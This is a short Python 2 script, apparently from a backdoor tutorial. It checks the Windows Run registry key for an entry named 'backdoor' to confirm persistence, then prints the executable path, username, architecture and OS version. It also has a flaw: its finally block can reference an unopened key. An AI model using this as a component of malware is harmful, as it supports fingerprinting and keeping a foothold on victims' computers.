import _winreg, platform, sys, os

RESTART= 'Yes'

try:
    serverKey = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
                                'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0) #1
    _winreg.QueryValueEx(serverKey, 'backdoor') #2
except: #3
    RESTART= 'No'
finally: #4
    _winreg.CloseKey(serverKey)                   

PATH = sys.executable #5
LOGIN_ID = os.environ['USERNAME'] #6
ARCHITECTURE = platform.machine() #7
VERSION = platform.platform() #8

print "Executavel:", PATH
print "Persistente(?):", RESTART
print "ID do usuario:", LOGIN_ID
print "Arquitetura:", ARCHITECTURE
print "Versao:", VERSION